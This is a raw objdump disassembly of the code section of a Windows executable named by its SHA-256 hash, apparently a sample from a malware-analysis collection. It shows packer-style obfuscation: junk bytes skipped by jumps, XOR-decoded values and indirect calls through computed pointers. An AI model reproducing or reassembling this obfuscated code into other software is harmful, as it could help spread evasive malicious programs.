
3fbd4e4972d6e0d762340db9a04ecea364176d3d4ce1c08e1b9ff72e7bb58c7b.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x2c
  401006:	mov    ecx,DWORD PTR ds:0x4292e5
  40100c:	mov    eax,ds:0x4292f5
  401011:	sub    eax,ecx
  401013:	xor    ecx,DWORD PTR [ecx+eax*1]
  401016:	mov    DWORD PTR [ebp-0x8],0xf89c8534
  40101d:	not    ecx
  40101f:	jmp    0x4010ec
  401024:	cdq    
  401025:	data16 cmc 
  401027:	push   edx
  401028:	push   ebp
  401029:	jge    0x4010a4
  40102b:	jge    0x401034
  40102d:	jmp    FWORD PTR [ebx+0x67323385]
  401033:	mov    edi,DWORD PTR [esp+edi*2+0x7c]
  401037:	jl     0x400fe5
  401039:	jl     0x4010b7
  40103b:	jl     0x401009
  40103d:	(bad)  
  40103e:	xor    ecx,ebx
  401040:	xor    eax,0xccddcfdb
  401045:	ja     0x4010bd
  401047:	or     ecx,DWORD PTR [edi]
  401049:	cwde   
  40104a:	or     cl,BYTE PTR [edi]
  40104c:	cmp    ecx,DWORD PTR [edi]
  40104e:	retf   0x3712
  401051:	sbb    bl,BYTE PTR [edi]
  401053:	mov    ch,0x52
  401055:	or     ah,BYTE PTR [edi-0x4e10f32f]
  40105b:	rol    esp,cl
  40105d:	or     ecx,DWORD PTR [esp+edx*1+0x4da8e6bc]
  401064:	sbb    DWORD PTR [ecx+0x541fb4dc],esp
  40106a:	out    dx,al
  40106b:	outs   dx,DWORD PTR ds:[esi]
  40106c:	add    ebx,DWORD PTR ds:0x4ac4729e
  401072:	mov    al,ds:0x36dd215b
  401077:	mov    eax,ds:0xa3c97380
  40107d:	je     0x4010b5
  40107f:	fisttp DWORD PTR [ebp+0x359ac4f5]
  401085:	jecxz  0x4010c1
  401087:	and    ebp,0x4f
  40108a:	aam    0x94
  40108c:	dec    ebp
  40108d:	inc    DWORD PTR [edi-0x2f5a886e]
  401093:	mov    cl,0x41
  401095:	loope  0x4010bb
  401097:	pop    ecx
  401098:	sub    edi,DWORD PTR [eax-0x41639320]
  40109e:	jae    0x4010bd
  4010a0:	retf   
  4010a1:	cwde   
  4010a2:	sub    eax,0xc85ce3c6
  4010a7:	(bad)  
  4010a8:	mov    dl,0xfa
  4010aa:	loopne 0x401044
  4010ac:	cmp    eax,0xc76966cf
  4010b1:	sub    al,cl
  4010b3:	or     ch,dl
  4010b5:	sbb    eax,0xb39945d
  4010ba:	outs   dx,DWORD PTR ds:[esi]
  4010bb:	ins    DWORD PTR es:[edi],dx
  4010bc:	jb     0x4010c0
  4010be:	cmp    eax,0x22468cd1
  4010c3:	jns    0x401144
  4010c5:	cmp    al,0x8f
  4010c7:	add    bl,dl
  4010c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4010ca:	add    edx,DWORD PTR [ebx+0x59]
  4010cd:	rol    esp,1
  4010cf:	add    eax,0x15d55edb
  4010d4:	jge    0x401072
  4010d6:	mov    ah,0x43
  4010d8:	daa    
  4010d9:	sbb    DWORD PTR [ebx],esp
  4010db:	addr16 and eax,0x4f3cdb10
  4010e1:	loop   0x4010a4
  4010e3:	xchg   esi,eax
  4010e4:	adc    bl,BYTE PTR [edi]
  4010e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4010e7:	(bad)  
  4010e8:	pop    ecx
  4010e9:	jg     0x40110d
  4010eb:	scas   eax,DWORD PTR es:[edi]
  4010ec:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  4010f3:	mov    eax,0x9507
  4010f8:	add    DWORD PTR ds:0x427cf7,ecx
  4010fe:	jmp    0x4011cb
  401103:	leave  
  401104:	mov    bh,BYTE PTR [edi+esi*4-0x7536b24d]
  40110b:	pop    ebx
  40110c:	mov    dl,0x88
  40110e:	les    ecx,FWORD PTR [esi]
  401110:	mov    ch,0xed
  401112:	adc    eax,0x7c7c7cac
  401117:	lods   al,BYTE PTR ds:[esi]
  401118:	jl     0x401196
  40111a:	jl     0x40111c
  40111c:	dec    eax
  40111d:	stos   DWORD PTR es:[edi],eax
  40111e:	pop    ebp
  40111f:	mov    al,ds:0x50e42e04
  401124:	outs   dx,BYTE PTR ds:[esi]
  401125:	or     ebp,ebx
  401127:	mov    ebx,0xb2c6c0c5
  40112c:	or     DWORD PTR [esi-0x56],0x18944a51
  401133:	ds mov ecx,0xddb3b164
  401139:	mov    ecx,0x3e884951
  40113e:	mov    al,0xb9
  401140:	mov    ecx,0xe299d358
  401145:	int    0x28
  401147:	dec    eax
  401148:	cmp    esi,edx
  40114a:	aad    0xb4
  40114c:	pop    es
  40114d:	add    ecx,DWORD PTR [esi]
  40114f:	lea    esp,[eax-0x700a5202]
  401155:	jle    0x40112c
  401157:	add    eax,0xb12f2c2a
  40115c:	xor    eax,0xbed99461
  401161:	inc    esp
  401162:	mov    ah,0xe7
  401164:	push   es
  401165:	(bad)  
  401166:	and    DWORD PTR [esi],esi
  401168:	out    dx,al
  401169:	test   al,0x7c
  40116b:	add    DWORD PTR [ecx],ebp
  40116d:	in     al,0xc0
  40116f:	inc    ebx
  401170:	dec    esi
  401171:	push   esi
  401172:	(bad)  
  401173:	pusha  
  401174:	push   es
  401175:	out    0x3f,al
  401177:	cld    
  401178:	repz scas eax,DWORD PTR es:[edi]
  40117a:	loop   0x401115
  40117c:	clc    
  40117d:	fld    TBYTE PTR [ebx-0x1e]
  401180:	sti    
  401181:	xor    al,0xf6
  401183:	jne    0x401201
  401185:	sti    
  401186:	pushf  
  401187:	mov    ebx,0xa71c764f
  40118d:	xchg   edx,eax
  40118e:	dec    esp
  40118f:	jno    0x401144
  401191:	cmp    ecx,ebx
  401193:	push   ebp
  401194:	pushf  
  401195:	or     BYTE PTR [ebp-0x65224858],ah
  40119b:	mov    ebx,0x6e129f3d
  4011a0:	add    edi,ecx
  4011a2:	jmp    0x2804:0x1d18f91e
  4011a9:	aaa    
  4011aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4011ab:	push   edi
  4011ac:	psubsw mm4,QWORD PTR [ebp-0x60]
  4011b0:	bound  ebx,QWORD PTR [edi-0xb50db1]
  4011b6:	dec    ebp
  4011b7:	into   
  4011b8:	push   edx
  4011b9:	or     BYTE PTR [bp-0x2d88],ah
  4011be:	div    DWORD PTR [eax+ebx*1]
  4011c1:	aad    0xb4
  4011c3:	mov    ebx,0x6d929904
  4011c8:	fild   QWORD PTR [eax+0x4589668a]
  4011ce:	cld    
  4011cf:	lea    eax,[ebp-0x24]
  4011d2:	xor    DWORD PTR ds:0x4275a0,0x226
  4011dc:	mov    DWORD PTR [ebp-0x28],eax
  4011df:	not    DWORD PTR ds:0x4292b5
  4011e5:	mov    eax,DWORD PTR [ebp+0x8]
  4011e8:	movzx  ecx,BYTE PTR ds:0x4275a4
  4011ef:	adc    ecx,DWORD PTR ds:0x4292cd
  4011f5:	mov    DWORD PTR ds:0x4275a4,ecx
  4011fb:	mov    DWORD PTR [ebp-0x20],eax
  4011fe:	xor    DWORD PTR ds:0x42c89e,0x5a6f
  401208:	push   ebx
  401209:	sub    DWORD PTR ds:0x4275a0,ebx
  40120f:	lea    eax,[ebp-0x18]
  401212:	mov    DWORD PTR ds:0x4275ac,0x15
  40121c:	cmp    DWORD PTR ds:0x4275ac,0x0
  401223:	je     0x40124e
  401229:	cmp    DWORD PTR ds:0x4275ac,0x1b
  401230:	jne    0x40123c
  401236:	call   DWORD PTR ds:0x4279b7
  40123c:	mov    ebx,DWORD PTR ds:0x4275ac
  401242:	dec    ebx
  401243:	mov    DWORD PTR ds:0x4275ac,ebx
  401249:	jmp    0x40121c
  40124e:	mov    DWORD PTR [ebp-0x1c],eax
  401251:	movzx  ebx,WORD PTR ds:0x4292c5
  401258:	and    DWORD PTR ds:0x42c896,ebx
  40125e:	mov    eax,DWORD PTR [ebp-0x1c]
  401261:	mov    DWORD PTR ds:0x4292ad,0xc0c
  40126b:	push   esi
  40126c:	push   edi
  40126d:	or     edi,ecx
  40126f:	mov    edi,0xf89f2dad
  401274:	add    ebx,0x5343
  40127a:	mov    DWORD PTR [eax],edi
  40127c:	sub    ecx,DWORD PTR ds:0x427d1f
  401282:	mov    eax,DWORD PTR [ebp-0x14]
  401285:	add    DWORD PTR ds:0x4275a4,0x42c886
  40128f:	mov    ebx,DWORD PTR [ebp-0x8]
  401292:	mov    ecx,0x7510857
  401297:	sbb    DWORD PTR ds:0x427d03,ecx
  40129d:	xor    eax,ecx
  40129f:	mov    esi,0x32729e
  4012a4:	sub    DWORD PTR ds:0x4292b9,0x427cf7
  4012ae:	xor    ebx,ecx
  4012b0:	xor    edx,edx
  4012b2:	add    eax,esi
  4012b4:	adc    DWORD PTR ds:0x4292d5,0x427d07
  4012be:	jmp    0x40138b
  4012c3:	ror    BYTE PTR [edx],0x15
  4012c6:	std    
  4012c7:	std    
  4012c8:	std    
  4012c9:	fsubr  DWORD PTR ds:0xe0012c42
  4012cf:	adc    cl,BYTE PTR [esi+ebp*8+0x29]
  4012d3:	fdivr  QWORD PTR [edi+0x7c]
  4012d6:	jl     0x401284
  4012d8:	jl     0x401356
  4012da:	jl     0x401289
  4012dc:	mov    ebp,0xebe6394c
  4012e1:	lahf   
  4012e2:	test   BYTE PTR [ebx],ch
  4012e4:	je     0x401341
  4012e6:	lds    ecx,FWORD PTR [edi+0x3fb4466d]
  4012ec:	pop    eax
  4012ed:	and    DWORD PTR [ecx+0x31512f04],edi
  4012f3:	out    dx,al
  4012f4:	lods   al,BYTE PTR ds:[esi]
  4012f5:	fst    DWORD PTR [esp+ecx*1+0x39ad5732]
  4012fc:	sub    eax,0x1f2bd2f2
  401301:	jp     0x401285
  401303:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401304:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401305:	sar    DWORD PTR [ecx+eax*2+0x4a],cl
  401309:	shr    BYTE PTR [eax],0x2c
  40130c:	and    al,0x35
  40130e:	add    al,0x5b
  401310:	cdq    
  401311:	mov    al,ds:0x3de4e046
  401316:	call   0x6566:0x9a0fb07e
  40131d:	data16 int3 
  40131f:	out    dx,al
  401320:	test   al,0x3
  401322:	dec    ebp
  401323:	add    BYTE PTR [eax+0x6cfea9f0],0x3
  40132a:	mov    ah,0x2c
  40132c:	out    0x98,al
  40132e:	(bad)  
  40132f:	popa   
  401330:	out    0xea,al
  401332:	and    dh,BYTE PTR [ecx+0x3b]
  401335:	retf   
  401336:	rol    DWORD PTR [eax+0x3264f507],cl
  40133c:	pop    ds
  40133d:	(bad)  
  40133f:	in     al,0xab
  401341:	jb     0x4012da
  401343:	ror    dl,0xe
  401346:	rcl    BYTE PTR [eiz*8+0x3b521410],cl
  40134d:	arpl   WORD PTR [eax-0x69],cx
  401350:	daa    
  401351:	xor    ecx,DWORD PTR [eax+0x7ae77080]
  401357:	shl    esp,0xca
  40135a:	mov    dl,0xb7
  40135c:	jp     0x4013d9
  40135e:	mul    BYTE PTR [esi]
  401360:	pop    eax
  401361:	jne    0x401339
  401363:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401364:	cli    
  401365:	add    eax,0xad260ca2
  40136a:	sar    DWORD PTR [esp+edi*2-0x44b8764e],1
  401371:	inc    edi
  401372:	retf   0x6ae7
  401375:	adc    esi,ebp
  401377:	dec    edi
  401378:	cmp    al,0xc1
  40137a:	xor    esi,DWORD PTR [esi+0x77905f7d]
  401380:	lods   eax,DWORD PTR ds:[esi]
  401381:	and    DWORD PTR [edx-0x120defe3],edx
  401387:	sub    BYTE PTR [edx-0x21fcbae2],al
  40138d:	div    ebx
  40138f:	mov    edx,0x67cd
  401394:	mov    edx,DWORD PTR [ebp-0x20]
  401397:	mov    DWORD PTR [ebp-0x2c],0x4eb5
  40139e:	jmp    0x40146b
  4013a3:	(bad)  
  4013a4:	mov    bl,ch
  4013a6:	nop
  4013a7:	jge    0x40140c
  4013a9:	jns    0x4013f5
  4013ab:	imul   edi,DWORD PTR [ecx-0x60fac5e5],0x7e0cb64d
  4013b5:	jl     0x401433
  4013b7:	lods   al,BYTE PTR ds:[esi]
  4013b8:	jl     0x401436
  4013ba:	jl     0x401416
  4013bc:	xor    bl,bl
  4013be:	stc    
  4013bf:	call   0x6cf5266c
  4013c4:	ror    dh,1
  4013c6:	mov    bh,BYTE PTR [esi-0x1477a9e7]
  4013cc:	and    BYTE PTR [ebp*8+0x18ba9621],bh
  4013d3:	inc    ebx
  4013d4:	stos   DWORD PTR es:[edi],eax
  4013d5:	shr    BYTE PTR [edi],cl
  4013d7:	call   0x48ac7640
  4013dc:	inc    ebp
  4013dd:	cmp    cl,BYTE PTR [esi+0x54]
  4013e0:	les    edi,FWORD PTR [ebx-0x4b]
  4013e3:	sub    eax,0x1a676f6f
  4013e8:	mov    eax,ds:0x7bb4df8a
  4013ed:	ds iret 
  4013ef:	aaa    
  4013f0:	lods   eax,DWORD PTR ds:[esi]
  4013f1:	out    0xd6,al
  4013f3:	and    BYTE PTR [edx-0x6],ah
  4013f6:	in     al,dx
  4013f7:	xor    eax,0x91ea7e94
  4013fc:	ds push ecx
  4013fe:	add    eax,0x14ba0f69
  401403:	xor    DWORD PTR [eax],ebp
  401405:	clc    
  401406:	dec    edx
  401407:	rcr    BYTE PTR [edi-0x312e42a],1
  40140d:	and    eax,0x4f1ed84
  401412:	mov    al,ds:0x25397923
  401417:	add    edx,DWORD PTR fs:[edi+0x31477b91]
  40141e:	dec    eax
  40141f:	iret   
  401420:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401421:	xor    al,BYTE PTR [ecx-0x5c613bd2]
  401427:	scas   al,BYTE PTR es:[edi]
  401428:	xor    BYTE PTR [eax-0x488fbb4e],ah
  40142e:	sti    
  40142f:	jp     0x401423
  401431:	bound  esi,QWORD PTR [esi-0x46ce8528]
  401437:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401438:	rcl    BYTE PTR ds:0x19c5b537,cl
  40143e:	xchg   ecx,eax
  40143f:	push   ebp
  401440:	loop   0x401498
  401442:	or     dl,BYTE PTR [edx]
  401444:	sbb    dh,BYTE PTR [eax]
  401446:	sub    edi,DWORD PTR [esp+eax*8-0xa]
  40144a:	(bad)  
  40144c:	xchg   esp,eax
  40144d:	ror    DWORD PTR [ebp-0x3b],cl
  401450:	jbe    0x40143a
  401452:	inc    DWORD PTR [edx+0x19e44166]
  401458:	xor    al,0xe7
  40145a:	push   ecx
  40145b:	xchg   DWORD PTR [ebx+0x55bba274],edi
  401461:	lea    ecx,[ecx-0x32]
  401464:	icebp  
  401465:	(bad)  
  401466:	das    
  401467:	repz sub eax,0x23b1afa
  40146d:	mov    DWORD PTR ds:0x427594,0x1170
  401477:	je     0x40195a
  40147d:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  401484:	sub    DWORD PTR ds:0x42759c,edx
  40148a:	lea    eax,[ebp-0xc]
  40148d:	mov    DWORD PTR [ebp-0x10],eax
  401490:	sub    edx,eax
  401492:	mov    eax,DWORD PTR [ebp-0x10]
  401495:	not    edx
  401497:	mov    edx,DWORD PTR [eax]
  401499:	imul   edx,edx,0xf89ea9e0
  40149f:	mov    DWORD PTR ds:0x42c88a,0x7964
  4014a9:	mov    DWORD PTR [eax],edx
  4014ab:	mov    DWORD PTR ds:0x4292d9,0x7646
  4014b5:	mov    eax,DWORD PTR [ebp-0xc]
  4014b8:	cmp    eax,0x1fe34420
  4014bd:	mov    DWORD PTR ds:0x4292d5,0x4bbf
  4014c7:	je     0x401629
  4014cd:	and    ebx,0x6650
  4014d3:	jmp    0x4015a0
  4014d8:	cs scas eax,DWORD PTR es:[edi]
  4014da:	inc    ebp
  4014db:	add    eax,0xa36ee545
  4014e0:	sbb    DWORD PTR [edi-0x640f1a20],ebx
  4014e6:	mov    ds:0x7c7ebc53,eax
  4014eb:	jl     0x401499
  4014ed:	jl     0x40156b
  4014ef:	jl     0x401552
  4014f1:	xchg   edi,eax
  4014f2:	sbb    esp,DWORD PTR [ecx-0x6cd258a1]
  4014f8:	dec    edx
  4014f9:	shl    DWORD PTR [edi-0x63],cl
  4014fc:	inc    eax
  4014fd:	in     al,0xe1
  4014ff:	push   esi
  401500:	fadd   DWORD PTR [ebx+0x4a038a64]
  401506:	jg     0x4014e8
  401508:	mov    ch,0x73
  40150a:	dec    ebx
  40150b:	push   ebx
  40150c:	ss cwde 
  40150e:	sbb    eax,0xd7eca323
  401513:	and    BYTE PTR [edi],0x28
  401516:	loop   0x40149e
  401518:	retf   0xd72a
  40151b:	inc    ebp
  40151c:	add    ebp,esi
  40151e:	or     DWORD PTR [edi+ecx*1-0x35],edx
  401522:	mov    ch,0x56
  401524:	or     al,0xc2
  401526:	dec    ebp
  401527:	jle    0x4014ee
  401529:	retf   
  40152a:	mov    eax,0x5866400c
  40152f:	inc    esp
  401530:	not    BYTE PTR [esi-0x7e165612]
  401536:	jmp    0x4473dc2a
  40153b:	loop   0x4015aa
  40153d:	pusha  
  40153e:	mov    ch,0x56
  401540:	in     al,0xfe
  401542:	in     al,dx
  401543:	gs dec eax
  401545:	sub    bl,BYTE PTR [esi]
  401547:	inc    esp
  401548:	or     ecx,DWORD PTR [ebp-0x5b]
  40154b:	add    dh,dl
  40154d:	iret   
  40154e:	or     DWORD PTR [edx-0x39530d66],ecx
  401554:	sbb    al,0xd2
  401556:	xchg   esi,eax
  401557:	ins    DWORD PTR es:[edi],dx
  401558:	ja     0x401559
  40155a:	cmc    
  40155b:	dec    esi
  40155c:	je     0x401524
  40155e:	mov    bl,0x60
  401560:	aad    0xbe
  401562:	call   DWORD PTR [ecx+0x5e]
  401565:	cs ins BYTE PTR es:[edi],dx
  401567:	(bad)  [edi+ecx*8]
  40156a:	fwait
  40156b:	inc    eax
  40156c:	pop    ebx
  40156d:	das    
  40156e:	sub    BYTE PTR [edx-0x5f],ch
  401571:	jmp    0x401581
  401573:	mov    edi,0x6441f902
  401578:	dec    edi
  401579:	inc    ebp
  40157a:	jae    0x40159a
  40157c:	xchg   edi,eax
  40157d:	mov    ebp,0x1d8b9811
  401582:	push   edx
  401583:	mov    al,0xc0
  401585:	xlat   BYTE PTR ds:[ebx]
  401586:	push   cs
  401587:	xchg   esp,eax
  401588:	jae    0x401601
  40158a:	add    DWORD PTR [edi+0x28cebbf7],eax
  401590:	push   0x67849068
  401595:	and    ecx,0x8c802d8a
  40159b:	dec    ecx
  40159c:	scas   eax,DWORD PTR es:[edi]
  40159d:	stos   BYTE PTR es:[edi],al
  40159e:	fcom   DWORD PTR [eax-0x7e1bba75]
  4015a4:	or     BYTE PTR [eax-0x389f8ae4],dl
  4015aa:	add    eax,0x427598
  4015af:	adc    al,0x0
  4015b1:	add    BYTE PTR [eax],al
  4015b3:	cmp    DWORD PTR ds:0x427598,0x0
  4015ba:	je     0x40160a
  4015c0:	cmp    DWORD PTR ds:0x427598,0x6
  4015c7:	jne    0x4015d9
  4015cd:	push   DWORD PTR [ebp-0x1c]
  4015d0:	push   DWORD PTR [ebp-0xc]
  4015d3:	call   DWORD PTR ds:0x427c3f
  4015d9:	cmp    DWORD PTR ds:0x427598,0x7
  4015e0:	jne    0x4015f4
  4015e6:	xor    eax,eax
  4015e8:	xor    eax,DWORD PTR ds:0x427598
  4015ee:	dec    eax
  4015ef:	mov    ds:0x427598,eax
  4015f4:	mov    eax,ds:0x427598
  4015f9:	dec    eax
  4015fa:	mov    ds:0x427598,eax
  4015ff:	jmp    0x4015b3
  401604:	or     DWORD PTR ds:0x427594,edi
  40160a:	mov    eax,DWORD PTR [ebp-0x8]
  40160d:	mov    ebx,DWORD PTR ds:0x427d8c
  401613:	mov    edi,DWORD PTR ds:0x42c8de
  401619:	sub    edi,ebx
  40161b:	sub    ebx,DWORD PTR [ebx+edi*1]
  40161e:	xor    eax,ecx
  401620:	add    eax,esi
  401622:	pop    edi
  401623:	pop    esi
  401624:	pop    ebx
  401625:	leave  
  401626:	ret    0x4
  401629:	mov    eax,DWORD PTR [ebp-0xc]
  40162c:	add    eax,DWORD PTR [ebp-0x18]
  40162f:	cmp    eax,0x188271cd
  401634:	je     0x401648
  40163a:	mov    eax,DWORD PTR [ebp-0x10]
  40163d:	and    DWORD PTR [eax],0x751c9d
  401643:	jmp    0x4015a9
  401648:	mov    eax,DWORD PTR [ebp-0xc]
  40164b:	mov    edx,DWORD PTR [ebp-0x18]
  40164e:	or     eax,edx
  401650:	cmp    eax,0xffff6dad
  401655:	je     0x401669
  40165b:	mov    eax,DWORD PTR [ebp-0x10]
  40165e:	xor    DWORD PTR [eax],0x2650fa8f
  401664:	jmp    0x4015a9
  401669:	mov    ax,WORD PTR [ebp-0x4]
  40166d:	mov    edi,DWORD PTR [ebp+0x8]
  401670:	mov    edi,DWORD PTR [edi]
  401672:	mov    edx,0x8a42
  401677:	xor    ax,dx
  40167a:	mov    edx,0x3b08
  40167f:	add    ax,dx
  401682:	cmp    ax,WORD PTR [edi]
  401685:	je     0x401939
  40168b:	mov    eax,DWORD PTR [ebp-0x14]
  40168e:	xor    eax,ecx
  401690:	add    eax,esi
  401692:	mov    DWORD PTR [ebp-0x24],eax
  401695:	mov    eax,DWORD PTR [ebp-0x28]
  401698:	mov    di,WORD PTR [ebp-0x2c]
  40169c:	mov    ebx,0x8a42
  4016a1:	xor    di,bx
  4016a4:	jmp    0x401771
  4016a9:	pop    ebp
  4016aa:	and    ebx,DWORD PTR [ebp-0x65]
  4016ad:	jge    0x40172c
  4016af:	pop    ebp
  4016b0:	in     eax,0x36
  4016b2:	call   0x862d:0x470628ca
  4016b9:	in     al,dx
  4016ba:	jno    0x401738
  4016bc:	jl     0x40166a
  4016be:	jl     0x40173c
  4016c0:	jl     0x40167f
  4016c2:	(bad)  
  4016c3:	jno    0x401742
  4016c5:	xor    eax,0xa5fc9998
  4016cb:	ins    BYTE PTR es:[edi],dx
  4016cc:	jno    0x401673
  4016ce:	mov    eax,0xcf453fb
  4016d3:	dec    esp
  4016d4:	loopne 0x4016c6
  4016d6:	outs   dx,DWORD PTR ds:[esi]
  4016d7:	sub    eax,0x47955631
  4016dc:	push   edi
  4016dd:	or     eax,0x15680
  4016e2:	test   ebx,eax
  4016e4:	xchg   edx,eax
  4016e5:	xor    DWORD PTR [ebx-0x2249b116],edi
  4016eb:	pop    ds
  4016ec:	lods   eax,DWORD PTR fs:[esi]
  4016ee:	adc    al,0x95
  4016f0:	jmp    0x7f54763
  4016f5:	in     al,dx
  4016f6:	xchg   esp,eax
  4016f7:	xor    BYTE PTR [ebp+0x4a],dl
  4016fa:	test   eax,0x7efdbebc
  4016ff:	xchg   BYTE PTR [ebp-0x6f],dl
  401702:	out    0xb7,al
  401704:	stos   DWORD PTR es:[edi],eax
  401705:	shl    DWORD PTR [esi-0x1cb954f7],1
  40170b:	sbb    dl,al
  40170d:	jl     0x40171c
  40170f:	push   ds
  401710:	addr16 mov cl,0x58
  401713:	sub    edi,edi
  401715:	or     BYTE PTR [eax+ebx*8],0x68
  401719:	cmp    DWORD PTR [ecx+eiz*1+0x66],edx
  40171d:	mov    ah,BYTE PTR [edi+0x2d9cf8f8]
  401723:	inc    eax
  401724:	paddusw mm5,mm0
  401727:	xchg   ecx,eax
  401728:	push   edi
  401729:	fdivr  DWORD PTR [ecx+ecx*4+0x36]
  40172d:	shl    BYTE PTR [edi+ecx*2+0x13],cl
  401731:	sbb    BYTE PTR [ecx],ch
  401733:	fs stos DWORD PTR es:[edi],eax
  401735:	jae    0x401797
  401737:	and    DWORD PTR [ebp-0x6db46ee3],0x85c28fb3
  401741:	add    eax,0x24ec6568
  401746:	cs push eax
  401748:	pushf  
  401749:	xchg   ebx,eax
  40174a:	in     al,0xd2
  40174c:	(bad)  
  40174e:	loop   0x4016f1
  401750:	adc    eax,0xf29f96a5
  401755:	and    esp,edx
  401757:	in     eax,0x2b
  401759:	cmp    al,0x6f
  40175b:	xchg   esi,eax
  40175c:	jecxz  0x40174e
  40175e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40175f:	pop    esp
  401760:	inc    DWORD PTR [edx]
  401762:	test   DWORD PTR [edi],0xdf39abd6
  401768:	mov    al,ds:0x5eea36f
  40176d:	aas    
  40176e:	mov    DWORD PTR [edi-0x5fc9978],esi
  401774:	movzx  edx,di
  401777:	mov    edi,DWORD PTR [ebp-0x8]
  40177a:	jmp    0x401847
  40177f:	repz shl DWORD PTR [edx+0x55456240],cl
  401786:	jecxz  0x401791
  401788:	push   cs
  401789:	scas   eax,DWORD PTR es:[edi]
  40178a:	ror    bl,1
  40178c:	inc    ebp
  40178d:	call   0x7cb03491
  401792:	jl     0x401740
  401794:	jl     0x401812
  401796:	jl     0x40178b
  401798:	sti    
  401799:	sub    eax,0x5863a607
  40179e:	pop    esp
  40179f:	sbb    bh,BYTE PTR [ebx-0x36d509f6]
  4017a5:	js     0x4017f2
  4017a7:	sahf   
  4017a8:	les    ebx,FWORD PTR [ebx]
  4017aa:	dec    edx
  4017ab:	sub    BYTE PTR [esi-0xecd62d7],dh
  4017b1:	xchg   ecx,eax
  4017b2:	pop    ds
  4017b3:	sub    eax,0xc3276028
  4017b8:	cmp    DWORD PTR [ebx+ebx*1],esp
  4017bb:	mov    bh,0xd
  4017bd:	std    
  4017be:	outs   dx,BYTE PTR ds:[esi]
  4017bf:	add    dh,bh
  4017c1:	push   ebx
  4017c2:	test   al,0xd
  4017c4:	sti    
  4017c5:	pop    edi
  4017c6:	jbe    0x40180e
  4017c8:	mov    ch,0xc4
  4017ca:	daa    
  4017cb:	jle    0x40177f
  4017cd:	ins    BYTE PTR es:[edi],dx
  4017ce:	out    0x25,al
  4017d0:	shr    DWORD PTR [ebx],0x21
  4017d3:	pop    edx
  4017d4:	fadd   st(5),st
  4017d6:	jno    0x40177e
  4017d8:	add    DWORD PTR [esi-0x13],edi
  4017db:	js     0x4017f3
  4017dd:	in     eax,dx
  4017de:	pop    edx
  4017df:	push   ebx
  4017e0:	cmp    bh,BYTE PTR [ebx]
  4017e2:	ins    DWORD PTR es:[edi],dx
  4017e3:	pusha  
  4017e4:	mov    WORD PTR [edx+0x66a36c41],es
  4017ea:	and    eax,0xe7704a32
  4017ef:	cwde   
  4017f0:	fstp   QWORD PTR [ebx+esi*4]
  4017f3:	mov    esi,0x50926ca1
  4017f8:	loopne 0x401850
  4017fa:	ds jg  0x401822
  4017fd:	es push 0x602e932f
  401803:	push   0x68cd740d
  401808:	mov    edx,0x8cf2285f
  40180d:	sbb    BYTE PTR [eax+eiz*2],al
  401810:	enter  0x3bd1,0xfc
  401814:	(bad)  
  401816:	inc    ebx
  401817:	jmp    0x46e74327
  40181c:	sbb    eax,0xea144265
  401821:	xchg   esp,eax
  401822:	repnz xor eax,0xdca1a761
  401828:	xor    BYTE PTR [edx+0x12],0x3
  40182c:	rcr    BYTE PTR [ebp+0xa30b1f2],cl
  401832:	jmp    0x40189a
  401834:	mov    ds,WORD PTR [ebp-0x19c48eb3]
  40183a:	not    DWORD PTR [edi]
  40183c:	lods   eax,DWORD PTR ds:[esi]
  40183d:	sub    ebp,DWORD PTR [ebx]
  40183f:	aam    0x66
  401841:	cld    
  401842:	in     al,0x66
  401844:	xor    dh,dl
  401846:	jbe    0x40187b
  401848:	stc    
  401849:	lea    edx,[edx+edi*1+0x32729e]
  401850:	add    DWORD PTR [eax],edx
  401852:	mov    eax,DWORD PTR [ebp-0x20]
  401855:	mov    edx,DWORD PTR [ebp-0x8]
  401858:	mov    edi,DWORD PTR [ebp-0x24]
  40185b:	xor    edx,ecx
  40185d:	add    edx,esi
  40185f:	imul   edx,edi
  401862:	sub    DWORD PTR [eax],edx
  401864:	jmp    0x401931
  401869:	pop    ebx
  40186a:	jno    0x401829
  40186c:	loope  0x4018eb
  40186e:	jge    0x4018cb
  401870:	lods   eax,DWORD PTR ds:[esi]
  401871:	xlat   BYTE PTR ds:[ebx]
  401872:	mov    bh,0x47
  401874:	jns    0x4018df
  401876:	adc    esi,DWORD PTR [ecx+0x7c704c60]
  40187c:	jl     0x40182a
  40187e:	jl     0x4018fc
  401880:	jl     0x4018ff
  401882:	shl    BYTE PTR [eax],cl
  401884:	ja     0x40181c
  401886:	test   eax,0xb2fe3160
  40188b:	or     DWORD PTR [eax],0xffffffa9
  40188e:	jo     0x4018cb
  401890:	retf   0xd569
  401893:	fnstenv [ebx-0x1b]
  401896:	hlt    
  401897:	test   al,0x4c
  401899:	mov    bl,0xb5
  40189b:	mov    ah,0xf2
  40189d:	push   ds
  40189e:	popf   
  40189f:	and    al,0x67
  4018a1:	mov    ah,0x89
  4018a3:	rcl    BYTE PTR [edi],0xc4
  4018a6:	add    BYTE PTR cs:[edi-0x7e],ah
  4018aa:	lea    ebx,[ebp+0x4b]
  4018ad:	jne    0x401877
  4018af:	jns    0x4018db
  4018b1:	pop    esi
  4018b2:	xchg   BYTE PTR [eax+edi*4-0x2f],ch
  4018b6:	ins    BYTE PTR es:[edi],dx
  4018b7:	mov    ah,0x88
  4018b9:	or     eax,0x1452a63b
  4018be:	inc    ebx
  4018bf:	pop    esi
  4018c0:	or     BYTE PTR [ecx+0x75c99933],0x90
  4018c7:	cli    
  4018c8:	ror    BYTE PTR [esi],cl
  4018ca:	or     al,0x92
  4018cc:	neg    BYTE PTR [ecx+0x2127e0b6]
  4018d2:	int3   
  4018d3:	and    al,0x76
  4018d5:	lds    ebp,FWORD PTR [ecx-0x68d1164a]
  4018db:	mov    gs,WORD PTR [ebx]
  4018dd:	repz xchg edx,eax
  4018df:	(bad)  
  4018e0:	in     al,dx
  4018e1:	aas    
